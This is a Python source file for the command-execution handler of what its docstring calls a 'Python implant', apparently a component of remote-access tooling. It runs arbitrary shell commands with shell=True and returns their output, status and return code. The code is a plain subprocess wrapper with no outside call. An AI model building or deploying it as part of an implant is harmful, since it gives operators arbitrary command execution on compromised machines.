"""Shell command execution handler for the Python implant."""
from __future__ import annotations
import subprocess
import sys


class ExecHandler:
    """Run arbitrary shell commands and capture output."""

    DEFAULT_TIMEOUT = 60

    def run(self, cmd: str, timeout: int = DEFAULT_TIMEOUT, shell: bool = True) -> dict:
        """
        Execute cmd via the OS shell, return structured result.

        Returns:
            {"status": "ok"|"error"|"timeout", "output": str, "returncode": int}
        """
        try:
            proc = subprocess.run(
                cmd,
                shell=shell,
                capture_output=True,
                text=True,
                timeout=timeout,
            )
            out = (proc.stdout or "") + (proc.stderr or "")
            return {
                "status": "ok" if proc.returncode == 0 else "error",
                "output": out.strip(),
                "returncode": proc.returncode,
            }
        except subprocess.TimeoutExpired:
            return {"status": "timeout", "output": f"Command timed out after {timeout}s", "returncode": -1}
        except Exception as exc:
            return {"status": "error", "output": str(exc), "returncode": -1}
